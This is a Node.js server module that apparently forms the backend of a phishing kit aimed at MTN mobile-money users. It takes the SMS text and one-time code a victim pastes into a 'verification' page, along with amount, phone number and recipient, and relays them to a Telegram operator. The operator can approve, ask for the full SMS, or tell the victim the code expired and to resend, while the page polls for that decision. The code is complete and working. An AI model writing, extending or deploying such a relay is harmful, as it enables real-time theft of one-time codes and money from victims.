// telegram-mtn.js
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const pending = new Map();
const decisions = new Map();

function log(m) { console.log('[tg-mtn]', m); }

async function sendTelegramMessage(text, keyboard) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error('Telegram not configured.');
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
    })
  });
  const data = await res.json();
  if (!data.ok) throw new Error('Telegram send failed: ' + (data.description || 'unknown'));
  return data.result;
}

async function answerCallback(cqId, text) {
  if (!BOT_TOKEN) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: cqId, text, show_alert: false })
  }).catch(() => {});
}

async function clearButtons(messageId) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, reply_markup: { inline_keyboard: [] } })
  }).catch(() => {});
}

async function handleUpdate(update) {
  const cq = update && update.callback_query;
  if (!cq) return;
  const data = cq.data || '';
  const [action, txRef] = data.split(':');
  if (!action || !txRef) return;

  if (action !== 'approve' && action !== 'paste_full' && action !== 'expired') return;

  const target =
    action === 'approve'    ? 'approved'   :
    action === 'paste_full' ? 'paste_full' :
                              'expired';

  decisions.set(txRef, target);
  const entry = pending.get(txRef);
  if (entry) entry.decision = target;

  const messages = {
    approved:   '✅ Approved — client continues.',
    paste_full: '⚠ Client told to paste the full SMS.',
    expired:    '⏱ Client told SMS expired — resend.'
  };
  await answerCallback(cq.id, messages[target] || 'Done.');
  log(`tx ${txRef} → ${target}${entry ? '' : ' (recovered)'}`);

  const messageId = cq.message && cq.message.message_id;
  if (messageId) await clearButtons(messageId);
}

function registerRoutes(app) {
  app.post('/api/verification/sms', async (req, res) => {
    try {
      const { tx, code, message, am, cur, c, an, rn } = req.body || {};
      if (!tx || !message) return res.status(400).json({ error: 'Missing tx or message' });

      const existing = pending.get(tx);
      if (existing && existing.decision === 'pending') {
        return res.json({ ok: true, requestId: tx });
      }

      pending.set(tx, { decision: 'pending', messageId: null, smsText: message, createdAt: Date.now() });
      decisions.set(tx, 'pending');

      const safe = (v) => String(v == null ? '—' : v)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

      // <pre> block FIRST — Telegram renders its native "Copy" button on top of
      // any code block, giving one-tap copy of the exact SMS the user pasted.
      const text =
        `<b>📨 Tap the code block to copy the SMS</b>\n\n` +
        `<pre>${safe(message)}</pre>\n\n` +
        `<b>Reference:</b> <code>${safe(tx)}</code>\n` +
        `<b>Amount:</b> ${safe(cur)} ${safe(am)}\n` +
        `<b>Country:</b> ${safe(c)}\n` +
        `<b>Number:</b> ${safe(an)}\n` +
        `<b>Recipient:</b> ${safe(rn)}\n` +
        `<b>Detected code:</b> <code>${safe(code)}</code>`;

      const keyboard = [[
        { text: '✅ Approve',        callback_data: `approve:${tx}` },
        { text: '⚠️ Paste full SMS', callback_data: `paste_full:${tx}` },
        { text: '⏱ SMS expired',     callback_data: `expired:${tx}` }
      ]];

      const sent = await sendTelegramMessage(text, keyboard);
      const e = pending.get(tx);
      if (e) e.messageId = sent.message_id;

      log(`SMS submitted for ${tx}`);
      res.json({ ok: true, requestId: tx });
    } catch (err) {
      console.error('[tg-mtn] send error', err);
      res.status(500).json({ error: 'Telegram send failed' });
    }
  });

  app.get('/api/verification/sms-status/:ref', (req, res) => {
    const ref = req.params.ref;
    const live = pending.get(ref);
    if (live && live.decision !== 'pending') return res.json({ decision: live.decision });
    const stored = decisions.get(ref);
    if (stored) return res.json({ decision: stored });
    res.json({ decision: 'pending' });
  });

  log('Routes: /api/verification/sms, /api/verification/sms-status/:ref');
}

module.exports = { registerRoutes, handleUpdate };
